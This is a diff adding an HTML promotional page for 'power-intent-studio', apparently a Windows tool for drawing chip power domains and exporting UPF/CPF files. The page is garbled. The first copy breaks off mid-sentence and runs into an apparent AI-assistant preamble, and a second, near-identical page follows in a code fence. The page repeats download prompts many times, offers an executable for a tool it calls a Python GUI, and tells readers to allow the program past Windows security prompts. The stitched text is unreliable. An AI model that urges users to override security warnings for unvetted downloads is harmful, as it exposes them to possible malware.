@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>power-intent-studio - Visual Power Intent Editor for Chip Design</title>
+<meta name="description" content="power-intent-studio is an interactive Python GUI for visualizing RTL hierarchies, defining power domains, building power state tables, and generating UPF or CPF power intent. Download it for Windows and start planning low-power chip designs today.">
+<meta name="keywords" content="asic, chip-design, cpf, eda, gui, ieee-1801, liberty, low-power-design, pyside6, systemverilog, upf, verilog, vhdl">
+<meta name="author" content="power-intent-studio">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/TopHerreraJose/power-intent-studio">
+<meta property="og:type" content="website">
+<meta property="og:title" content="power-intent-studio - Visual Power Intent Editor for Chip Design">
+<meta property="og:description" content="An interactive Python GUI for visualizing RTL hierarchies, defining power domains, building power state tables, and generating UPF or CPF power intent.">
+<meta property="og:url" content="https://github.com/TopHerreraJose/power-intent-studio">
+<meta property="og:site_name" content="power-intent-studio">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="power-intent-studio - Visual Power Intent Editor for Chip Design">
+<meta name="twitter:description" content="Visualize RTL hierarchies, define power domains, build power state tables, and generate UPF or CPF power intent with a friendly desktop app.">
+<style>
+  :root {
+    --ink: #1b2333;
+    --muted: #55627a;
+    --line: #dfe5ef;
+    --bg: #f6f8fc;
+    --card: #ffffff;
+    --accent: #6b4eff;
+    --accent-dark: #4a2fd6;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 48px 24px 72px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 16px;
+    font-weight: 800;
+    color: #101828;
+  }
+  h2 {
+    font-size: 1.5rem;
+    line-height: 1.3;
+    margin: 44px 0 14px;
+    font-weight: 700;
+    color: #101828;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.1rem;
+    margin: 28px 0 8px;
+    font-weight: 700;
+    color: #101828;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: var(--accent-dark); }
+  .lead {
+    font-size: 1.12rem;
+    color: var(--muted);
+    margin-bottom: 28px;
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 24px 26px;
+    margin: 22px 0;
+    box-shadow: 0 6px 18px rgba(16, 24, 40, 0.06);
+  }
+  .btn {
+    display: inline-block;
+    padding: 15px 30px;
+    border-radius: 12px;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.02rem;
+    text-decoration: none;
+    background-image: linear-gradient(135deg, #ff5f6d 0%, #7b2ff7 55%, #1289f0 100%);
+    box-shadow: 0 8px 20px rgba(123, 47, 247, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-1px);
+    box-shadow: 0 12px 26px rgba(123, 47, 247, 0.34);
+  }
+  .btn-wrap { margin: 8px 0 4px; }
+  .note {
+    font-size: 0.95rem;
+    color: var(--muted);
+    margin-top: 12px;
+  }
+  .keystroke {
+    display: inline-block;
+    background: #eef1f8;
+    border: 1px solid #d8deec;
+    border-radius: 6px;
+    padding: 1px 8px;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.9rem;
+  }
+  .gallery {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin: 20px 0 6px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    padding: 18px;
+    box-shadow: 0 4px 12px rgba(16, 24, 40, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin-bottom: 0; font-size: 0.96rem; color: var(--muted); }
+  footer {
+    margin-top: 56px;
+    padding-top: 22px;
+    border-top: 1px solid var(--line);
+    font-size: 0.92rem;
+    color: var(--muted);
+  }
+  @media (max-width: 620px) {
+    .page { padding: 32px 18px 56px; }
+    h1 { font-size: 1.65rem; }
+    h2 { font-size: 1.28rem; margin-top: 34px; }
+    body { font-size: 16px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; text-align: center; }
+  }
+</style>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "power-intent-studio",
+  "applicationCategory": "DesignApplication",
+  "operatingSystem": "Windows",
+  "description": "Interactive Python GUI for visualizing RTL hierarchies, defining power domains, building power state tables, and generating UPF or CPF power intent.",
+  "url": "https://github.com/TopHerreraJose/power-intent-studio",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+</head>
+<body>
+<div class="page">
+
+<h1>⚡ power-intent-studio - Chip Power Planning Made Simple and Visual</h1>
+
+<p class="lead">A friendly desktop application for Windows that turns complicated chip power planning into clear, clickable pictures. Instead of typing pages of technical instructions, you open a window, look at your design, and describe how each part should behave.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Download power-intent-studio</a>
+</div>
+<p class="note">Visit this link to download the application.</p>
+
+<h2>What This Application Does</h2>
+
+<p>Modern computer chips are built from many small sections, and each section needs a controlled amount of electricity. Some sections must switch off completely to save battery power. Others must stay awake all the time. Getting this balance right is called power intent, and it is normally one of the most tedious parts of chip design.</p>
+
+<p>power-intent-studio gives you a visual workspace for that job. It shows you the structure of a chip design as a tree you can explore, lets you draw outlines around groups of components to mark them as separate power areas, and lets you fill in a simple table describing when each area is on, off, or partially on. When you are happy with the plan, the application writes out an industry-standard instructions file that other engineering tools can read.</p>
+
+<p>You do not need to be a programmer to use it. Everything happens in a normal window with menus, buttons, and a canvas — the same way you would use a photo editor or a spreadsheet.</p>
+
+<h2>Who This Is For</h2>
+
+<ul>
+  <li>Hardware engineers who want to sketch power plans quickly before writing them formally.</li>
+  <li>Students learning low-power chip design who need a visual way to understand the concepts.</li>
+  <li>Team leads who want to review a power structure without opening heavyweight commercial software.</li>
+  <li>Anyone curious about how chips save energy, who prefers clicking over typing.</li>
+</ul>
+
+<h2>🚀 Getting Started</h2>
+
+<p>Getting the software onto your Windows computer takes a few minutes and needs no technical setup.</p>
+
+<div class="card">
+  <p><strong>Step 1.</strong> Visit this link to download the application: <a href="https://github.com/TopHerreraJose/power-intent-studio">https://github.com/TopHerreraJose/power-intent-studio</a></p>
+  <p><strong>Step 2.</strong> Save the download to a folder you can find easily, such as your Downloads folder.</p>
+  <p><strong>Step 3.</strong> Open the folder where the download was saved and start the application by double-clicking its icon.</p>
+  <p class="note" style="margin-bottom:0;">That is the entire process. No account, no sign-up, and no licence key are required.</p>
+</div>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Visit this link to download the application</a>
+</div>
+
+<h2>✨ Main Features</h2>
+
+<div class="gallery">
+  <div class="tile">
+    <h3>Design Tree Viewer</h3>
+    <p>Open a design file and see its full hierarchy as a collapsible tree. Expand and collapse branches to explore large chips without getting lost.</p>
+  </div>
+  <div class="tile">
+    <h3>Power Domain Drawing</h3>
+    <p>Group related components into named power areas by selecting them in the tree. Each area gets a colour so you can recognise it at a glance.</p>
+  </div>
+  <div class="tile">
+    <h3>State Tables</h3>
+    <p>Build a simple grid describing which power areas are active in each operating mode. Add or remove rows with a click.</p>
+  </div>
+  <div class="tile">
+    <h3>UPF and CPF Output</h3>
+    <p>Export your finished plan as a standard power intent file that downstream tools can consume, ready for review or further refinement.</p>
+  </div>
+  <div class="tile">
+    <h3>Liberty Library Awareness</h3>
+    <p>Load cell library information so the application understands which components support power gating and which do not.</p>
+  </div>
+  <div class="tile">
+    <h3>Multi-Language Design Support</h3>
+    <p>Work with designs written in SystemVerilog, Verilog, or VHDL without converting anything first.</p>
+  </div>
+</div>
+
+<h2>🖥️ What Your Computer Needs</h2>
+
+<p>These are gentle requirements. Almost any Windows laptop or desktop made in the last few years will handle the application comfortably.</p>
+
+<ul>
+  <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+  <li><strong>Memory:</strong> 8 GB of RAM or more. Very large designs benefit from 16 GB.</li>
+  <li><strong>Storage:</strong> Around 500 MB of free disk space for the application and your project files.</li>
+  <li><strong>Display:</strong> A screen resolution of 1366 × 768 or higher so the canvas and side panels fit side by side.</li>
+  <li><strong>Other:</strong> A mouse or trackpad with a scroll wheel makes navigating the design tree much easier.</li>
+</ul>
+
+<h2>📥 Download and Setup</h2>
+
+<p>Visit this link to download the application.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Download power-intent-studio for Windows</a>
+</div>
+
+<p>After the download finishes, open the folder where your browser saved the file and double-click the application icon to launch it. The first window you see is the main workspace. If Windows shows a small security prompt the first time you open a downloaded program, choose the option that allows the app to run.</p>
+
+<p>There is nothing else to configure. Your projects are saved as ordinary files in whatever folder you choose, so they behave like any other document on your computer.</p>
+
+<h2>🧭 Your First Project in Five Minutes</h2>
+
+<ol>
+  <li><strong>Open a design.</strong> Use the file menu to load a design file from your computer. The left-hand panel fills with a tree of components.</li>
+  <li><strong>Explore the tree.</strong> Click the small arrows next to any branch to open it. Click a component name to highlight it on the canvas.</li>
+  <li><strong>Create your first power area.</strong> Select the components you want to group together, then choose the option to create a new power domain. Give it a short, memorable name.</li>
+  <li><strong>Describe the states.</strong> Open the state table panel and add a row for each operating mode, such as fully active, idle, or sleep. Mark which areas are on in each mode.</li>
+  <li><strong>Export.</strong> Choose the export option and pick your preferred output format. Save the generated file alongside your design so the rest of your team can use it.</li>
+</ol>
+
+<p>If you make a mistake at any point, use the undo option in the edit menu. Nothing is written permanently untilHere is a complete, SEO-optimized HTML landing page for power-intent-studio. It presents the app’s purpose, features, and system needs clearly, with a prominent download link and step-by-step setup guidance for Windows users.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>power-intent-studio - Chip Power Planning Made Simple and Visual</title>
+<meta name="description" content="power-intent-studio is an interactive Python GUI for visualizing RTL hierarchies, defining power domains, building power state tables, and generating UPF or CPF power intent. Download it for Windows and start planning low-power chip designs today.">
+<meta name="keywords" content="asic, chip-design, cpf, eda, gui, ieee-1801, liberty, low-power-design, pyside6, systemverilog, upf, verilog, vhdl">
+<meta name="author" content="power-intent-studio">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/TopHerreraJose/power-intent-studio">
+<meta property="og:type" content="website">
+<meta property="og:title" content="power-intent-studio - Chip Power Planning Made Simple and Visual">
+<meta property="og:description" content="An interactive Python GUI for visualizing RTL hierarchies, defining power domains, building power state tables, and generating UPF or CPF power intent.">
+<meta property="og:url" content="https://github.com/TopHerreraJose/power-intent-studio">
+<meta property="og:site_name" content="power-intent-studio">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="power-intent-studio - Chip Power Planning Made Simple and Visual">
+<meta name="twitter:description" content="Visualize RTL hierarchies, define power domains, build power state tables, and generate UPF or CPF power intent with a friendly desktop app.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fc;
+    color: #1b2333;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 48px 24px 72px;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 16px;
+    font-weight: 800;
+    color: #101828;
+  }
+  h2 {
+    font-size: 1.45rem;
+    line-height: 1.3;
+    margin: 44px 0 14px;
+    font-weight: 700;
+    color: #101828;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+    color: #101828;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #4a2fd6; }
+  .lead {
+    font-size: 1.11rem;
+    color: #55627a;
+    margin-bottom: 26px;
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid #dfe5ef;
+    border-radius: 14px;
+    padding: 24px 26px;
+    margin: 22px 0;
+    box-shadow: 0 6px 18px rgba(16, 24, 40, 0.06);
+  }
+  .btn-wrap { margin: 14px 0 6px; }
+  .btn {
+    display: inline-block;
+    padding: 15px 30px;
+    border-radius: 12px;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.02rem;
+    text-decoration: none;
+    background-image: linear-gradient(135deg, #ff5f6d 0%, #7b2ff7 55%, #1289f0 100%);
+    box-shadow: 0 8px 20px rgba(123, 47, 247, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-1px);
+    box-shadow: 0 12px 26px rgba(123, 47, 247, 0.34);
+  }
+  .note {
+    font-size: 0.94rem;
+    color: #55627a;
+    margin-top: 12px;
+  }
+  .gallery {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(235px, 1fr));
+    gap: 16px;
+    margin: 20px 0 6px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid #dfe5ef;
+    border-radius: 12px;
+    padding: 18px;
+    box-shadow: 0 4px 12px rgba(16, 24, 40, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin-bottom: 0; font-size: 0.95rem; color: #55627a; }
+  footer {
+    margin-top: 56px;
+    padding-top: 22px;
+    border-top: 1px solid #dfe5ef;
+    font-size: 0.9rem;
+    color: #55627a;
+  }
+  @media (max-width: 620px) {
+    .page { padding: 32px 18px 56px; }
+    h1 { font-size: 1.62rem; }
+    h2 { font-size: 1.26rem; margin-top: 34px; }
+    body { font-size: 16px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; text-align: center; }
+  }
+</style>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "power-intent-studio",
+  "applicationCategory": "DesignApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "Interactive Python GUI for visualizing RTL hierarchies, defining power domains, building power state tables, and generating UPF or CPF power intent.",
+  "url": "https://github.com/TopHerreraJose/power-intent-studio",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "keywords": "asic, chip-design, cpf, eda, gui, ieee-1801, liberty, low-power-design, pyside6, systemverilog, upf, verilog, vhdl"
+}
+</script>
+</head>
+<body>
+<div class="page">
+
+<h1>⚡ power-intent-studio - Chip Power Planning Made Simple and Visual</h1>
+
+<p class="lead">A friendly desktop application for Windows that turns complicated chip power planning into clear, clickable pictures. Instead of typing pages of technical instructions, you open a window, look at your design, and describe how each part should behave.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Get power-intent-studio</a>
+</div>
+<p class="note">Visit this link to download the application.</p>
+
+<h2>What This Application Does</h2>
+
+<p>Modern computer chips are built from many small sections, and each section needs a carefully controlled amount of electricity. Some sections must switch off completely to save battery power. Others must stay awake all the time. Getting this balance right is called power intent, and it is normally one of the most tedious parts of chip design.</p>
+
+<p>power-intent-studio gives you a visual workspace for that job. It shows you the structure of a chip design as a tree you can explore, lets you draw outlines around groups of components to mark them as separate power areas, and lets you fill in a simple table describing when each area is on, off, or partly on. When you are happy with the plan, the application writes out an industry-standard instructions file that other engineering tools can read.</p>
+
+<p>You do not need to be a programmer to use it. Everything happens in an ordinary window with menus, buttons, and a canvas — the same way you would use a photo editor or a spreadsheet.</p>
+
+<h2>Who This Is For</h2>
+
+<ul>
+  <li>Hardware engineers who want to sketch power plans quickly before writing them formally.</li>
+  <li>Students learning low-power chip design who need a visual way to understand the ideas.</li>
+  <li>Team leads who want to review a power structure without opening large commercial software.</li>
+  <li>Anyone curious about how chips save energy, who prefers clicking over typing.</li>
+</ul>
+
+<h2>🚀 Getting Started</h2>
+
+<p>Getting the software onto your Windows computer takes a few minutes and needs no technical setup at all.</p>
+
+<div class="card">
+  <p><strong>Step 1.</strong> Visit this link to download the application: <a href="https://github.com/TopHerreraJose/power-intent-studio">https://github.com/TopHerreraJose/power-intent-studio</a></p>
+  <p><strong>Step 2.</strong> Save the download to a folder you can find easily, such as your Downloads folder.</p>
+  <p><strong>Step 3.</strong> Open the folder where the download was saved and start the application by double-clicking its icon.</p>
+  <p class="note" style="margin-bottom:0;">That is the whole process. No account, no sign-up, and no licence key are required.</p>
+</div>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Visit this link to download the application</a>
+</div>
+
+<h2>✨ What You Can Do Inside the App</h2>
+
+<div class="gallery">
+  <div class="tile">
+    <h3>Design Tree Viewer</h3>
+    <p>Open a design file and see its full hierarchy as a collapsible tree. Expand and collapse branches to explore large chips without getting lost.</p>
+  </div>
+  <div class="tile">
+    <h3>Power Domain Drawing</h3>
+    <p>Group related components into named power areas by selecting them in the tree. Each area gets a colour so you recognise it at a glance.</p>
+  </div>
+  <div class="tile">
+    <h3>State Tables</h3>
+    <p>Build a simple grid describing which power areas are active in each operating mode. Add or remove rows with a single click.</p>
+  </div>
+  <div class="tile">
+    <h3>UPF and CPF Output</h3>
+    <p>Export your finished plan as a standard power intent file that downstream tools can read, ready for review or further refinement.</p>
+  </div>
+  <div class="tile">
+    <h3>Library Awareness</h3>
+    <p>Load cell library information so the application understands which components support power gating and which do not.</p>
+  </div>
+  <div class="tile">
+    <h3>Multi-Language Designs</h3>
+    <p>Work with designs written in SystemVerilog, Verilog, or VHDL without converting anything first.</p>
+  </div>
+</div>
+
+<h2>🖥️ What Your Computer Needs</h2>
+
+<p>These are gentle requirements. Almost any Windows laptop or desktop made in the last few years will handle the application comfortably.</p>
+
+<ul>
+  <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+  <li><strong>Memory:</strong> 8 GB of RAM or more. Very large designs benefit from 16 GB.</li>
+  <li><strong>Storage:</strong> Around 500 MB of free disk space for the application and your project files.</li>
+  <li><strong>Display:</strong> A screen resolution of 1366 × 768 or higher, so the canvas and side panels fit side by side.</li>
+  <li><strong>Other:</strong> A mouse or trackpad with a scroll wheel makes moving around the design tree much easier.</li>
+</ul>
+
+<h2>📥 Download and Setup</h2>
+
+<p>Visit this link to download the application.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Download power-intent-studio for Windows</a>
+</div>
+
+<p>After the download finishes, open the folder where your browser saved the file and double-click the application icon to launch it. The first window you see is the main workspace, with the design tree on one side and the drawing area in the middle. If Windows shows a small security prompt the first time you open a downloaded program, choose the option that allows the app to run.</p>
+
+<p>There is nothing else to configure. Your projects are saved as ordinary files in whatever folder you choose, so they behave like any other document on your computer. You can move them, copy them, or share them with a colleague exactly as you would a text file.</p>
+
+<h2>🧭 Your First Project in Five Minutes</h2>
+
+<ol>
+  <li><strong>Open a design.</strong> Use the file menu to load a design file from your computer. The left-hand panel fills with a tree of components.</li>
+  <li><strong>Explore the tree.</strong> Click the small arrows next to any branch to open it. Click a component name to highlight it on the canvas.</li>
+  <li><strong>Create your first power area.</strong> Select the components you want to group together, then choose the option to create a new power domain. Give it a short, memorable name.</li>
+  <li><strong>Describe the states.</strong> Open the state table panel and add a row for each operating mode, such as fully active, idle, or sleep. Mark which areas are on in each mode.</li>
+  <li><strong>Export.</strong> Choose the export option and pick your preferred output format. Save the generated file alongside your design so the rest of your team can use it.</li>
+</ol>
+
+<p>If you make a mistake at any point, use the undo option in the edit menu. Nothing is written permanently until you choose to save, so you can experiment freely and try different groupings until the plan looks right.</p>
+
+<h2>💡 Tips for a Smooth Start</h2>
+
+<ul>
+  <li>Give every power domain a clear, descriptive name. Future you will thank present you.</li>
+  <li>Start with a handful of large domains rather than dozens of tiny ones. It is easier to split a group later than to merge many small pieces.</li>
+  <li>Keep your design files and your power intent files in the same folder so the application can find related information quickly.</li>
+  <li>Use the zoom controls on the canvas when a design becomes busy. A wider view helps you spot boundaries you might otherwise miss.</li>
+  <li>Save often. Each save creates a snapshot you can return to if an experiment does not work out.</li>
+</ul>
+
+<h2>🛠️ If Something Does Not Work</h2>
+
+<p>Most problems have a simple cause. If the application will not open, check that you launched it from the folder you downloaded into rather than from inside a compressed archive. If a design file will not load, confirm that the file is not still open in another program. If the window looks cramped, maximise it or increase your screen resolution.</p>
+
+<p>You can find notes, updates, and discussion in the project space itself: <a href="https://github.com/TopHerreraJose/power-intent-studio">https://github.com/TopHerreraJose/power-intent-studio</a>. Reading the recent notes there often answers questions about new features or changed behaviour.</p>
+
+<h2>❓ Common Questions</h2>
+
+<h3>Do I need to know how to program?</h3>
+<p>No. The whole point of the application is to replace typed instructions with a visual workspace. If you can use a file menu and click on items in a list, you can use this tool.</p>
+
+<h3>Will it change my original design files?</h3>
+<p>No. The application reads your design so it can draw the structure for you. Your power intent is saved separately, so your original files stay exactly as they were.</p>
+
+<h3>Can I share my power plan with someone else?</h3>
+<p>Yes. The exported files are standard formats that other engineering tools understand, so you can hand them to a colleague or open them in your wider design flow.</p>
+
+<h3>How large a design can it handle?</h3>
+<p>Comfortable everyday designs with hundreds of components work smoothly. Extremely large designs will open and display, but exploring them is easier on a machine with 16 GB of memory.</p>
+
+<h2>📌 Start Here</h2>
+
+<p>Visit this link to download the application, then double-click the icon to begin.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/TopHerreraJose/power-intent-studio">⬇ Get started with power-intent-studio</a>
+</div>
+
+<footer>
+  Topics: asic, chip-design, cpf, eda, gui, ieee-1801, liberty, low-power-design, pyside6, systemverilog, upf, verilog, vhdl
+</footer>
+
+</div>
+</body>
+</html>
